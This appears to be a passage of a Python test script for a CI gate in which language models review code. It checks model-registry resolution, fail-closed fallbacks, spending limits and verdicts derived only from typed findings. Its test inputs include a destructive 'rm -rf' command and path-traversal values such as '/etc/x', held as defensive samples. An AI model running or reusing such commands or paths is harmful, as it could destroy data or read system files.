    ("an empty refusal failed as unread, as before #110", PRODUCT_WORKFLOW, lambda t: t.replace(REVIEW_TAKEN[PRODUCT_WORKFLOW][0], REVIEW_TAKEN[PRODUCT_WORKFLOW][1] + "\n          " + REVIEW_TAKEN[PRODUCT_WORKFLOW][0], 1)),
    # The budget and the recovery path (decision 0014, D and F(2)).
    ("a budget refusal handed to the fallback", None, lambda t: t.replace('[ -n "$FALLBACK" ] && ! refused && ', '[ -n "$FALLBACK" ] && ', 1)),
    ("a shortfall handed to the fallback", None, lambda t: t.replace("blocking|needs-context) return 0 ;;", "blocking) return 0 ;;", 1)),
    ("a shortfall never re-read", None, lambda t: t.replace('&& more $needed; then', '&& false; then', 1)),
    ("a shortfall left unsigned", None, lambda t: t.replace('            [ "$rc" -ne 0 ] || python3 "$reg/ask.py" incomplete "$out" || printf \'{"is_error":true,"subtype":"not_derived"}\\n\' > "$out"\n', "", 1)),
    ("a failed re-read taken as unread", None, lambda t: t.replace('then cp "$out.first" "$out"; rc=0; fi', "then :; fi", 1)),
    ("a re-read the budget refused signed blocking", None, lambda t: t.replace("if refused; then :; elif", "if false; then :; elif", 1)),
)


def _check_route_loosenings():
    """Both reviewers read by role, fall back, and never fail open; each loosening refused."""
    bad = 0
    for path in (REVIEW_WORKFLOW, PRODUCT_WORKFLOW):
        try:
            text = _read(path)
        except OSError as e:
            print("  wiring: %s" % e)
            return 1
        lost = route_faults(text, path)
        if lost:
            print("  wiring: %s must read by the registry's role, fall back, and never fail open; "
                  "it has lost %s" % (path, "; ".join(lost)))
            bad += 1
            continue
        for what, only, loosen in ROUTE_LOOSENINGS:
            if only not in (None, path):
                continue
            changed = loosen(text)
            if changed == text:
                print("  wiring: the loosening '%s' no longer applies to %s — rewrite it against "
                      "the file as it stands, or it proves nothing" % (what, path))
                bad += 1
            elif not route_faults(changed, path):
                print("  wiring: %s with %s passes the route hold — the guard for it is gone"
                      % (path, what))
                bad += 1
    if not bad:
        print("ok: each reviewer resolves its role from the registry — review.yml from the "
              "protected branch — reads once, hands a read that did not answer to its fallback, "
              "and fails closed when none answers; the reading block was run in %d case(s), and "
              "each of %d loosenings was refused" % (len(ROUTE_CASES), len(ROUTE_LOOSENINGS)))
    return bad


# THE REGISTRY ITSELF (decision 0008). model-registry/resolve.py checks it whole;
# this holds what the gate needs of it: the two reviewer roles, each at the
# one effort every read is owed and with nothing behind it, every networked
# provider asking for providers who promise not to store or train on what it
# sends, and a switch that is one edit to the one file.
def _check_registry():
    bad = 0

    def fault(what):
        nonlocal bad
        print("  registry: %s" % what)
        bad += 1

    try:
        spec = importlib.util.spec_from_file_location("resolve", RESOLVER)
        resolve = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(resolve)
        reg = resolve.load(REGISTRY)
    except (OSError, ValueError, ImportError, AttributeError) as e:
        fault("could not be read: %s" % e)
        return bad
    for f in resolve.check(reg):
        fault(f)
    # NOTHING STANDS BEHIND A REVIEWER (his rulings, 5 and 6 October 2026): only
    # open-weight models review, and when GLM does not answer the commit stays
    # unread and he is told, so no reviewer role names a fallback.
    owed = ((ORDINARY_ROLE, False), (RISKY_ROLE, False))
    got = {}
    for role, falls in owed:
        try:
            got[role] = resolve.resolve(reg, role)
        except resolve.Unresolved as e:
            fault(str(e))
            continue
        if got[role]["effort"] != REVIEW_EFFORT or got[role]["effort_checked"] != "yes":
            fault("%s reads at %r; every read is owed %s, on an effort its model is known to take"
                  % (role, got[role]["effort"], REVIEW_EFFORT))
        if bool(got[role]["fallback"]) != falls:
            fault("%s falls back to %r; nothing may stand behind a reviewer (his rulings, 5 and 6 "
                  "October 2026)" % (role, got[role]["fallback"]))
    # A PRODUCT'S CODE GOES TO WHICHEVER PROVIDER THE REGISTRY NAMES (his ruling,
    # 6 October 2026), so every provider a request is sent to over the network
    # asks only for providers who promise not to store or train on it: their
    # promise, not proof (his condition, 6 October 2026).
    for name, prov in sorted((reg.get("providers") or {}).items()):
        if prov.get("interface") == "openai-compatible" and \
                ((prov.get("extra") or {}).get("provider") or {}).get("data_collection") != "deny":
            fault("provider %s does not ask for providers who promise not to store or train on it, so a product's private code could be "
                  "stored or trained on by whoever serves it" % name)
    # One edit, one file: the ordinary role moved to another model in a copy of
    # the registry, and nothing else, is what the resolver then answers.
    other = next((m for m in sorted(reg.get("models") or {}) if ORDINARY_ROLE in got
                  and m != got[ORDINARY_ROLE]["model"]), None)
    if ORDINARY_ROLE in got and other:
        moved = json.loads(json.dumps(reg))
        moved["roles"][ORDINARY_ROLE]["model"] = other
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "registry.json")
            with open(path, "w", encoding="utf-8") as f:
                json.dump(moved, f)
            p = subprocess.run([sys.executable, RESOLVER, path, ORDINARY_ROLE, "model"],
                               capture_output=True, text=True, timeout=30)
        if p.returncode != 0 or p.stdout.strip() != other:
            fault("a switch of %s's model in the registry alone did not switch what it resolves "
                  "to (it said %r)" % (ORDINARY_ROLE, p.stdout.strip() or p.stderr.strip()))
    # And a role nobody defined, or a registry that names a blocked model, fails
    # closed rather than resolving to anything.
    blocked = json.loads(json.dumps(reg))
    if ORDINARY_ROLE in got:
        blocked["models"][got[ORDINARY_ROLE]["model"]]["status"] = "blocked"
    for what, r, role in (("an unknown role", reg, "reviewer-nobody"),
                          ("a role whose model is blocked", blocked, ORDINARY_ROLE)):
        try:
            resolve.resolve(r, role)
            fault("%s resolved; it must fail closed" % what)
        except resolve.Unresolved:
            pass
    if not bad:
        print("ok: the registry resolves %s and %s, both at %s with nothing behind them; a "
              "switch is one edit to %s, and an unknown role or a blocked model fails closed"
              % (ORDINARY_ROLE, RISKY_ROLE, REVIEW_EFFORT, REGISTRY))
    return bad


# THE CALLER, model-registry/ask.py: the OpenAI-compatible read, and the one place
# a verdict is made. What it must do is run here on answers a provider could
# give, never on a network: refuse a model it did not pin (no silent
# substitution), hand an answer on as written, make the verdict from the
# findings alone (decision 0014, position C: any blocking, else any advisory,
# else clean, whatever the model says of its own, and nothing read from the
# prose), clear nothing on an answer that is missing, malformed, of unknown
# severity or cut off, and still refuse on a blocking finding that survives a
# cut or a break. It counts the tokens and the cost and puts the effort where the
# registry says, sending no list of models.
CALLER = "model-registry/ask.py"


# ONE RECORD PER ATTEMPT (decision 0014, A), on the caller's own ledger: a
# fallback leaves two records, a call that never came back stays unresolved,
# a cost not known is never 0, a request never sent costs nothing and says so,
# and cash and plan are never added together.
def _check_attempts(ask, quiet=False):
    bad = 0

    def fault(what):
        nonlocal bad
        if not quiet:
            print("  caller: %s" % what)
        bad += 1
    real_urlopen = urllib.request.urlopen

    def no_request(*a, **k):
        raise AssertionError("a record made a request")
    urllib.request.urlopen = no_request
    with tempfile.TemporaryDirectory() as d:
        ans = os.path.join(d, "answer.json")

        def ledger(name, *steps):
            led = os.path.join(d, name)
            for role, model, route, rc, left, cost_bound in steps:
                n = ask.record_open(led, role, model, route)
                if cost_bound is not None:
                    ask.log_event(led, {"attempt": n, "event": "reserve", "bound": cost_bound})
                if rc is not None:
                    with open(ans, "w", encoding="utf-8") as f:
                        json.dump(left, f)
                    ask.record_close(led, n, rc, ans)
            return led, ask.summary(led)
        try:
            led, line = ledger("fallback.jsonl",
                               ("reviewer-main", "m1", "openai-compatible", 1, {"is_error": True, "subtype": "http_error"}, 0.5),
                               ("reviewer-fallback", "m2", "claude-code", 0, {"result": "r", "total_cost_usd": 1.25}, None))
            got = ask.attempts(led)
            if [a["attempt"] for a in got] != ["1", "2"] or any(a["unresolved"] for a in got):
                fault("a read that fell back did not leave two closed records (%s)" % got)
            for want in ("#1 reviewer-main m1 cash", "#2 reviewer-fallback m2 plan", "unresolved: 0",
                         "plan, all attempts: 1.25 USD", "cash, all attempts: unknown"):
                if want not in line:
                    fault("a fallback's spend line did not say %r (%s)" % (want, line))
            _, line = ledger("dead.jsonl", ("reviewer-fallback", "m2", "claude-code", None, None, None))
            if "unresolved: 1" not in line or "cost unknown" not in line:
                fault("a call that never came back was not one unresolved record (%s)" % line)
            _, line = ledger("stopped.jsonl", ("reviewer-main", "m1", "openai-compatible", 124, {}, 0.5))
            if "unresolved: 1" not in line or "cash, all attempts: unknown" not in line:
                fault("a call stopped with its response lost was not unresolved, or its cost not unknown (%s)" % line)
            _, line = ledger("budget.jsonl", ("reviewer-main", "m1", "openai-compatible", 1,
                                              {"is_error": True, "subtype": "budget_refused"}, None))
            if "budget refused, 0 USD" not in line or "cash, all attempts: 0 USD" not in line or "unresolved: 0" not in line:
                fault("a request the spending check refused was not a record of budget refused that cost nothing (%s)" % line)
            _, line = ledger("both.jsonl",
                             ("reviewer-main", "m1", "openai-compatible", 0, {"result": "r", "total_cost_usd": 0.25}, 0.5),
                             ("reviewer-fallback", "m2", "claude-code", 0, {"result": "r", "total_cost_usd": 4}, None))
            if "cash, all attempts: 0.25 USD" not in line or "plan, all attempts: 4 USD" not in line:
                fault("cash and plan were not kept apart (%s)" % line)
        except Exception as e:  # noqa: BLE001
            fault("the attempt records raised %s" % type(e).__name__)
        finally:
            urllib.request.urlopen = real_urlopen
    if not bad and not quiet:
        print("ok: every attempt is one record — a fallback two, a call that never came back or lost its response "
              "unresolved, a refused request a record that cost nothing — and the spend line keeps cash and "
              "plan apart and never calls an unknown cost 0")
    return bad


class _Answer(io.BytesIO):
    """A provider's answer, as urlopen hands it over."""


def _fake_net(routes, asked):
    """An urlopen that answers each path from `routes` and writes down every request it was sent."""
    def urlopen(req, timeout=None):
        url = req.full_url if hasattr(req, "full_url") else str(req)
        body = json.loads(req.data.decode("utf-8")) if getattr(req, "data", None) else None
        asked.append((urllib.parse.urlsplit(url).path, body))
        for tail, answer in routes.items():
            if url.endswith(tail):
                if isinstance(answer, Exception):
                    raise answer
                return _Answer(json.dumps(answer).encode("utf-8"))
        raise urllib.error.URLError("no route")
    return urlopen


# THE SPENDING CHECK (decision 0014, D): the rule run on its cases, and the
# caller run end to end with the network faked, so a refusal is seen to send
# nothing and an admitted request to carry both its limits.
def _check_spending(ask, path, quiet=False):
    bad = 0

    def fault(what):
        nonlocal bad
        if not quiet:
            print("  caller: %s" % what)
        bad += 1
    lim = {"input_price": 1.0, "output_price": 2.0, "output_tokens": 1000, "context": 100000}
    ok = {"usage_weekly": 0.5, "limit_remaining": 10}
    with tempfile.TemporaryDirectory() as d:
        open_cash = os.path.join(d, "open.jsonl")
        n = ask.record_open(open_cash, "reviewer-main", "m1", "openai-compatible")
        ask.log_event(open_cash, {"attempt": n, "event": "reserve", "bound": 0.6})
        no_bound = os.path.join(d, "nobound.jsonl")
        ask.record_open(no_bound, "reviewer-main", "m1", "openai-compatible")
        for what, weekly, data, inflight, led, admitted in (
                ("a request within the weekly limit", "1", ok, "0", "", True),
                ("a request past the weekly limit", "1", {"usage_weekly": 0.995, "limit_remaining": 10}, "0", "", False),
                ("a request past the key's own remaining limit", "", {"limit_remaining": 0.005}, "0", "", False),
                ("a request within the key's limit, no weekly limit set", "", {"limit_remaining": 5}, "0", "", True),
                ("no weekly limit and no limit on the key", "", {"limit_remaining": None}, "0", "", False),
                ("a week whose spend the provider does not report", "1", {"limit_remaining": 10}, "0", "", False),
                ("a key endpoint that does not answer", "1", OSError("down"), "0", "", False),
                ("reads in flight that could not be counted", "1", ok, "unknown", "", False),
                ("three reads in flight elsewhere, reserved", "1", ok, "3", "", False),
                ("an unresolved attempt of this job, reserved", "1", ok, "0", open_cash, False),
                ("an unresolved attempt with no bound", "1", ok, "0", no_bound, False),
                ("a weekly limit that is no amount", "six", ok, "0", "", False)):
            asked = []
            routes = {"/key": data if isinstance(data, Exception) else {"data": data}}
            try:
                most, why, basis = ask.admit("https://provider.test/api/v1", "k", lim, 9000, led, "9", weekly, inflight,
                                      fetch=_fake_net(routes, asked))
            except Exception as e:  # noqa: BLE001
                fault("%s made the spending check raise %s" % (what, type(e).__name__))
                continue
            if (most is not None) != admitted or (why and re.search(r"\d", why)) or (admitted and not basis):
                fault("%s was %s (%s), checked on %r" % (what, "admitted" if most is not None else "refused", why, basis))
        if ask.admit("https://provider.test", "k", None, 10, "", "1", "1", "0", fetch=_fake_net({}, []))[0] is not None:
            fault("a request whose most is unknown, with no limits in the registry, was admitted")
    # End to end: the caller's own main(), on the real registry, the network faked.
    reg = json.load(open(REGISTRY, encoding="utf-8"))
    model = resolve_role(reg, ORDINARY_ROLE)
    lim = ask.limits(reg, model)
    if lim is None:
        fault("the registry gives %s no output-token limit, price limit and context, so no request "
              "of it can be bounded" % ORDINARY_ROLE)
        return bad
    good = {"id": "gen-7", "model": model, "usage": {"prompt_tokens": 9, "completion_tokens": 2, "cost": 0.01},
            "choices": [{"message": {"content": json.dumps({"findings": [], "review": "r"})}}]}
    limit402 = urllib.error.HTTPError("https://x/chat/completions", 402, "Payment Required", {},
                                      io.BytesIO(b'{"error": {"message": "Insufficient credits"}}'))
    saved = {k: os.environ.get(k) for k in ("OPENROUTER_API_KEY", "INFLIGHT", "REVIEW_CASH_WEEKLY", "ATTEMPTS",
                                             "ATTEMPT", "GITHUB_STEP_SUMMARY")}
    real_urlopen, real_stdin = urllib.request.urlopen, sys.stdin
    with tempfile.TemporaryDirectory() as d:
        system = os.path.join(d, "system.txt")
        open(system, "w").write("s")
        for what, key, chat, sub, sent in (
                ("an admitted read", {"limit_remaining": 100}, good, None, True),
                ("a read past the key's limit", {"limit_remaining": 0.0001}, good, "budget_refused", False),
                ("a read whose headroom is unknown", OSError("down"), good, "budget_refused", False),
                ("a read the provider's own limit refuses", {"limit_remaining": 100}, limit402, "provider_limit", True),
                ("an answer from another model", {"limit_remaining": 100}, dict(good, model="vendor/other"),
                 "wrong_model", True)):
            led = os.path.join(d, "attempts-%d.jsonl" % abs(hash(what)))
            os.environ.update(OPENROUTER_API_KEY="k", INFLIGHT="0", REVIEW_CASH_WEEKLY="", ATTEMPTS=led, ATTEMPT="1",
                              GITHUB_STEP_SUMMARY=os.path.join(d, "summary"))
            asked = []
            urllib.request.urlopen = _fake_net({"/key": key if isinstance(key, Exception) else {"data": key},
                                                "/chat/completions": chat}, asked)
            sys.stdin = io.StringIO("p")
            heard = io.StringIO()
            try:
                import contextlib
                with contextlib.redirect_stdout(heard), contextlib.redirect_stderr(io.StringIO()):
                    rc = ask.main(["ask.py", REGISTRY, ORDINARY_ROLE, system, "{}", "60"])
                got = json.loads(heard.getvalue() or "{}")
            except Exception as e:  # noqa: BLE001
                fault("%s made the caller raise %s" % (what, type(e).__name__))
                continue
            finally:
                urllib.request.urlopen, sys.stdin = real_urlopen, real_stdin
            chats = [b for p, b in asked if p.endswith("/chat/completions")]
            if got.get("subtype") != sub or bool(chats) != sent or (sub is None and rc != 0):
                fault("%s answered %s (%s) and %s a request" % (what, rc, got.get("subtype"),
                                                               "sent" if chats else "sent no"))
            # The request as GLM's endpoints take it (6 October 2026): no
            # output-token limit and no price limit, which together left OpenRouter
            # no endpoint to serve #154's read.
            for body in chats:
                if "max_tokens" in body or "max_price" in (body.get("provider") or {}):
                    fault("%s was sent with a limit no GLM endpoint serves (%s, %s)"
                          % (what, body.get("max_tokens"), (body.get("provider") or {}).get("max_price")))
            events = ask._events(led)
            if sent and not any(e.get("event") == "reserve" and isinstance(e.get("bound"), float) for e in events):
                fault("%s was sent with nothing reserved for it" % what)
            if sub is None and "checked on the key's own remaining limit" not in ask.summary(led):
                fault("%s: the spend line does not say what the request was checked against (%s)"
                      % (what, ask.summary(led)))
            if chat is not limit402 and sent and not any(e.get("event") == "returned" and e.get("generation") == "gen-7"
                                                         and e.get("usage") for e in events):
                fault("%s: what the provider returned, usage and generation id, was not kept before the answer was "
                      "parsed" % what)
        # THE REQUEST AS IT WOULD LEAVE (decision 0014, E; his condition, 6 October
        # 2026): a registry edit that widens what leaves is refused before anything
        # is sent, not even the key endpoint is called.
        for what, widen in (
                ("a provider setting that swaps the model", lambda pr: pr["extra"].update(model="vendor/other")),
                ("a provider setting that adds a list of models", lambda pr: pr["extra"].update(models=["vendor/other"])),
                ("a provider that may store or train on the prompt",
                 lambda pr: pr["extra"]["provider"].update(data_collection="allow")),
                ("a provider with no data-collection ask", lambda pr: pr["extra"]["provider"].pop("data_collection"))):
            wide = json.loads(json.dumps(reg))
            widen(wide["providers"][wide["models"][model]["provider"]])
            path_ = os.path.join(d, "wide.json")
            with open(path_, "w", encoding="utf-8") as f:
                json.dump(wide, f)
            os.environ.update(OPENROUTER_API_KEY="k", INFLIGHT="0", REVIEW_CASH_WEEKLY="", ATTEMPTS="", ATTEMPT="1",
                              GITHUB_STEP_SUMMARY=os.path.join(d, "summary"))
            asked = []
            urllib.request.urlopen = _fake_net({"/key": {"data": {"limit_remaining": 100}},
                                                "/chat/completions": good}, asked)
            sys.stdin = io.StringIO("p")
            heard = io.StringIO()
            try:
                import contextlib
                with contextlib.redirect_stdout(heard), contextlib.redirect_stderr(io.StringIO()):
                    rc = ask.main(["ask.py", path_, ORDINARY_ROLE, system, "{}", "60"])
                got = json.loads(heard.getvalue() or "{}")
            except Exception as e:  # noqa: BLE001
                fault("%s made the caller raise %s" % (what, type(e).__name__))
                continue
            finally:
                urllib.request.urlopen, sys.stdin = real_urlopen, real_stdin
            if asked or rc == 0 or got.get("subtype") != "request_refused":
                fault("%s was not refused before sending (%d request(s) made, %s)"
                      % (what, len(asked), got.get("subtype")))
    for k, v in saved.items():
        if v is None:
            os.environ.pop(k, None)
        else:
            os.environ[k] = v
    if not bad and not quiet:
        print("ok: before any cash request the spending check adds the week's settled cash, what is in flight and "
              "the request's most, and refuses past the weekly limit or the key's own, or on anything unknown, "
              "sending nothing; an admitted request carries its output-token limit and price limit, is reserved "
              "before it is sent, and keeps what the provider returned before a word is parsed; the provider's "
              "own limit is a budget refusal")
    return bad


def resolve_role(reg, role):
    """The model a role names in the registry, read plainly."""
    return ((reg.get("roles") or {}).get(role) or {}).get("model")


def _check_caller(path=None, quiet=False):
    """The caller's tests, on `path` (a loosened copy, in _check_caller_loosenings) or the file itself."""
    path = path or CALLER
    bad = 0

    def fault(what):
        nonlocal bad
        if not quiet:
            print("  caller: %s" % what)
        bad += 1

    try:
        spec = importlib.util.spec_from_file_location("ask", path)
        ask = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(ask)
    except (OSError, ImportError, SyntaxError) as e:
        fault("could not be loaded: %s" % e)
        return bad
    pinned = "vendor/model-2"
    for served, want in ((pinned, True), (pinned + "-20260816", True), (pinned + "-flash", False),
                         ("vendor/model-1", False), ("", False), (pinned + "-2026", False)):
        if ask.served_is_pinned(served, pinned) != want:
            fault("an answer from %r %s" % (served, "refused" if want else "taken as the pinned model's"))
    said = "To the CTO. " + "I read the diff whole and checked each changed line against the brief. " * 3

    def answer(findings, review=said, **more):
        return json.dumps(dict({"findings": findings, "review": review}, **more))

    def finding(severity, text="a finding", files=None):
        return dict({"severity": severity, "text": text}, **({"files": files} if files is not None else {}))
    clean = answer([])

    def reply(model=pinned, content=clean, **more):
        r = {"model": model, "choices": [{"message": {"content": content}}],
             "usage": {"prompt_tokens": 900, "completion_tokens": 40, "cost": 0.0021}}
        r.update(more)
        return r
    # The transport: an answer is handed on as written, marked when the provider
    # cut it off, and refused when the model, the body or the content is wrong.
    for what, resp, rc, sub in (("an answer from the pinned model", reply(), 0, None),
                                ("an answer from another model", reply(model="vendor/other"), 1, "wrong_model"),
                                ("a refusal in the body", reply(error={"code": 500, "message": "Internal error"}), 1, "provider_error"),
                                # A spending limit is a budget refusal, which parks and never falls back (decision 0014, D).
                                ("a credit limit's refusal in the body", reply(error={"code": 402, "message": "Insufficient credits"}), 1, "provider_limit"),
                                ("the key's limit in the body", reply(error={"code": 403, "message": "Key limit exceeded"}), 1, "provider_limit"),
                                ("an answer with no content", reply(content=None), 1, "no_verdict"),
                                ("no object at all", [], 1, "no_answer")):
        got, status = ask.answer(resp, pinned)
        if status != rc or got.get("subtype") != sub:
            fault("%s answered %s (%s), not %s (%s)" % (what, status, got.get("subtype"), rc, sub))
    got, status = ask.answer(reply(), pinned)
    if status != 0 or got.get("result") != clean or "stop_reason" in got:
        fault("an answer was not handed on as the model wrote it")
    cutoff = reply()
    cutoff["choices"][0]["finish_reason"] = "length"
    got, status = ask.answer(cutoff, pinned)
    if status != 0 or got.get("stop_reason") != "max_tokens":
        fault("an answer the provider cut off for length was not marked as cut")

    # THE VERDICT, MADE FROM THE FINDINGS (decision 0014, position C). Each case is
    # (what happens, the answer, cut off for length, what comes of it, the words a
    # refusal must still carry): a verdict, or `none:` and the subtype of an answer
    # that clears nothing. No number reaches a `why`, where the workflow's why()
    # would read 429 as the provider's own refusal.
    intro = "To the CTO. Read verdict blocking, on one finding below."
    prose = "**1. Blocking — the page it left behind.** " + "It says the opposite. " * 20
    refusal = answer([finding("blocking", "the key leaks")], intro)
    cases = (
        ("a read with no findings", clean, False, "clean", ()),
        ("advisory findings alone", answer([finding("advisory"), finding("advisory", "another")]), False, "advisory", ()),
        ("one blocking finding among advisories",
         answer([finding("advisory"), finding("blocking", "the key leaks"), finding("advisory", "b")], intro),
         False, "blocking", (intro,)),
        ("a blocking finding spelt Blocking", answer([finding(" Blocking ")], intro), False, "blocking", (intro,)),
        ("a blocking finding with no text", answer([{"severity": "blocking"}], intro), False, "blocking", (intro,)),
        ("a finding of unknown severity", answer([finding("critical")]), False, "none:malformed", ()),
        ("a finding with no severity", answer([{"text": "t"}]), False, "none:malformed", ()),
        ("an advisory finding with no text", answer([finding("advisory", " ")]), False, "none:malformed", ()),
        ("a finding that is not an object", answer(["blocking"]), False, "none:malformed", ()),
        ("findings that are no list", json.dumps({"findings": "none", "review": said}), False, "none:malformed", ()),
        ("no review", json.dumps({"findings": []}), False, "none:malformed", ()),
        # The prose is read for nothing: a review that says blocking over no findings
        # is a read with no findings, and one that says nothing blocks over a blocking
        # finding is a refusal, which is what #148's round 4 signed the wrong way round.
        ("no findings, and a review that says it is blocking", answer([], "This is blocking: the key leaks."),
         False, "clean", ()),
        ("a blocking finding, and a review that says nothing blocks",
         answer([finding("blocking")], "Nothing blocks this change."), False, "blocking", ("Nothing blocks",)),
        ("an answer with prose written beside it", clean + "\n\nAlso: I think this is blocking.", False,
         "none:outside", ()),
        ("two answers, neither blocking", clean + " " + clean, False, "none:outside", ()),
        ("a read cut off for length, none blocking", clean, True, "none:truncated", ()),
        ("advisory findings, and the answer cut off", answer([finding("advisory")]), True, "none:truncated", ()),
        ("an answer cut off inside its findings, none said blocking",
         '{"findings": [{"severity": "advisory", "text": "the page it left', True, "none:truncated", ()),
        ("a blocking finding cut off inside its answer",
         '{"findings": [{"severity": "blocking", "text": "the page it left', True, "blocking",
         ("the page it left", "did not decode", "cut it off for length")),
        ("a blocking finding whole, the answer cut off after it", answer([finding("blocking")], "whole"), True,
         "blocking", ("whole", "cut this answer off for length after the words above")),
        ("no answer at all", "no object", False, "none:no_verdict", ()),
        ("malformed JSON", '{"findings": [ {oops', False, "none:no_verdict", ()),
        ("no content", None, False, "none:no_verdict", ()),
        ("an answer that is not text", {"findings": []}, False, "none:no_verdict", ()),
        ("the retired verdict shape, clean", '{"verdict": "clean", "review": "r"}', False, "none:no_verdict", ()),
        ("the retired verdict shape, blocking", '{"verdict": "blocking", "review": "r"}', False, "blocking",
         ('"verdict": "blocking"', "did not decode")),
        # The model's own word is ignored, except where it says blocking over findings
        # that do not: that is a clearance not taken, never a verdict.
        ("a verdict of its own, clean, over a blocking finding", answer([finding("blocking")], intro, verdict="clean"),
         False, "blocking", (intro,)),
        ("a verdict of its own, clean, over no findings", answer([], verdict="clean"), False, "clean", ()),
        ("a verdict of its own, advisory, over no findings", answer([], verdict="advisory"), False, "clean", ()),
        ("a verdict of its own, blocking, over advisory findings", answer([finding("advisory")], verdict="blocking"),
         False, "none:disagrees", ()),
        ("a verdict of its own, blocking, over no findings", answer([], verdict="blocking"), False, "none:disagrees", ()),
        # NO SILENT LOSS (#115's first reads: a `blocking` published with its findings
        # missing; #116's: parse before weighing a cut, and let no brace in the prose
        # hide the object): a refusal keeps every word beside it, wherever it sits.
        ("prose written before a refusal (#115's stub)", prose + "\n\n" + refusal, False, "blocking",
         (intro, "the page it left behind")),
        ("a `${{ … }}` in the prose before a refusal",
         "**1. Blocking — `${{ inputs.repo }}` is pasted into the script.** " + prose + "\n" + refusal, False,
         "blocking", ("${{ inputs.repo }}", intro)),
        ("a `}` in the prose after a refusal", refusal + "\n\nAnd a dict: {'a': 1}. " + prose, False, "blocking",
         ("{'a': 1}", intro)),
        ("a short finding beside a refusal", refusal + " Also: the brief is stale.", False, "blocking",
         ("the brief is stale",)),
        ("a clearance and a refusal together, where the worst speaks", clean + "\n" + refusal, False, "blocking",
         (intro,)),
        ("two refusals, the second's review kept",
         answer([finding("blocking")], "first") + " " + answer([finding("blocking")], "second"), False, "blocking",
         ("first", "second")),
        ("a refusal inside a wrapper object", '{"name": "answer", "arguments": %s}' % answer([finding("blocking")], "wrapped"),
         False, "blocking", ("wrapped",)),
        ("a refusal with a raw line break in its review",
         '{"findings": [{"severity": "blocking", "text": "t"}], "review": "line one\nline two"}', False, "blocking",
         ("line one\nline two",)),
        ("a refusal broken by an unescaped quote",
         '{"findings": [{"severity": "blocking", "text": "t"}], "review": "the "key" leaks"}', False, "blocking",
         ('the "key" leaks', "did not decode")),
        ("a refusal beside a code fence, which is kept", refusal + "\n\n```bash\nrm -rf x\n```", False, "blocking",
         ("```bash",)),
        # A READ SHORT OF CONTEXT (decision 0014, F(2)): it clears nothing and refuses
        # nothing until it is read again; a real blocking finding beside it speaks.
        ("a read short of context alone", answer([finding("needs-context", "need it", ["check.sh"])]), False,
         "needs-context", ()),
        ("a shortfall beside advisory findings", answer([finding("advisory"), finding("needs-context", "n", ["a.md"])]),
         False, "needs-context", ()),
        ("a real blocking finding beside a shortfall",
         answer([finding("needs-context", "n", ["a.md"]), finding("blocking", "b", [])], intro), False, "blocking", (intro,)),
        ("a shortfall naming no file", answer([finding("needs-context", "n")]), False, "none:malformed", ()),
        ("a shortfall naming an empty list", answer([finding("needs-context", "n", [])]), False, "none:malformed", ()),
        ("a shortfall cut off for length", answer([finding("needs-context", "n", ["a.md"])]), True, "none:truncated", ()),
        ("a clearance that only quotes the words",
         json.dumps({"findings": [], "review": 'The brief says a "severity": "blocking" finding must be listed.'}),
         False, "clean", ()),
    )
    for what, content, cut, want, words in cases:
        try:
            obj, why = ask.derive(content, cut)
        except Exception as e:  # noqa: BLE001
            fault("%s made the derivation raise %s, which would leave the read with no verdict at all"
                  % (what, type(e).__name__))
            continue
        if want.startswith("none:"):
            ok = obj is None and why[0] == want[5:] and not re.search(r"\d", why[1])
            got = "a verdict %r" % (obj and obj.get("verdict")) if obj else "%s, %r" % (why[0], why[1][:60])
        else:
            ok = obj is not None and obj.get("verdict") == want and all(w in obj.get("review", "") for w in words)
            got = (obj or {}).get("verdict") or "no verdict (%s)" % (why,)
        if not ok:
            fault("%s was derived as %s, not %s" % (what, got, want))
    # The typed findings the verdict stands on go on, and a verdict of its own is
    # named as ignored; a refusal's kept words are cut to what a comment can hold.
    obj, _ = ask.derive(answer([finding("advisory", "a"), finding("blocking", "b")], verdict="clean"))
    if obj is None or obj.get("ignored") != ["verdict"] or obj.get("findings") != [
            {"severity": "blocking", "text": "b"}, {"severity": "advisory", "text": "a"}]:
        fault("the findings were not carried on as typed, or the model's own verdict not named as ignored (%s)" % obj)
    obj, _ = ask.derive(answer([finding("needs-context", "n", ["a.md", "../up", "/etc/x", "b c", "a.md", "x/y.py",
                                                                 "z.sh", "four.md"])]))
    if obj is None or obj.get("needs") != ["a.md", "x/y.py", "z.sh"]:
        fault("a shortfall's files were not the paths a read may fetch, each once, at most %d (%s)"
              % (getattr(ask, "NEEDED", 0), obj and obj.get("needs")))
    obj, _ = ask.derive(clean)
    if obj is None or obj.get("ignored") != []:
        fault("a read that sent no verdict of its own was said to have had one ignored (%s)" % obj)
    obj, _ = ask.derive(answer([finding("advisory")], verdict="clean"))
    if obj is None or obj.get("verdict") != "advisory" or obj.get("ignored") != ["verdict"]:
        fault("an advisory read that sent a verdict of its own was not derived from its findings, or the "
              "verdict not named as ignored (%s)" % obj)
    # A comment holds 65,536 characters (#119's first read, blocking): the review,
    # the findings beneath it and a spend line go in one, and a comment GitHub
    # refuses skips the wake. The number is GitHub's, not the file's own, so each
    # path that publishes is held to a sum under it, whatever the model writes.
    def published(o):
        return len(o.get("review", "")) + sum(len(f["text"]) + 40 for f in o["findings"]) + 120
    huge = "x" * 100000
    for what, content, left_out in (
            ("two hundred long blocking findings and a long review", answer([finding("blocking", huge)] * 200, huge), 170),
            ("a refusal that will not decode, and long",
             '{"findings": [{"severity": "blocking", "text": "t"}' + huge, 0),
            ("a refusal with a long answer beside it", refusal + " " + huge, 0),
            ("forty long advisory findings and a long review", answer([finding("advisory", huge)] * 40, huge), 10),
            ("a clean read with a long review", answer([], huge), 0)):
        obj, _ = ask.derive(content)
        if obj is None or published(obj) > 60000:
            fault("%s published %s characters, past what one comment holds"
                  % (what, obj and published(obj)))
        elif obj.get("omitted") != left_out or any(len(f["text"]) > 520 for f in obj["findings"]):
            fault("%s left out %s findings, not %s, or published a finding's text without end"
                  % (what, obj.get("omitted"), left_out))
    obj, _ = ask.derive(answer([finding("advisory", "a")] * 40 + [finding("blocking", "b")]))
    if obj is None or obj["findings"][0]["severity"] != "blocking" or obj.get("omitted") != 11:
        fault("a long list of findings hid its one blocking finding, or did not count the ones it left out")
    obj2, _ = ask.derive(json.dumps({"findings": [finding("blocking")]}))
    if obj2 is None or "review" in obj2:
        fault("a refusal with no review at all was given one, which the signer takes for a review")

    # THE FILE, as the workflows hand it over: either caller's answer, rewritten so
    # its `result` is the verdict, and refused the network.
    import contextlib
    import io
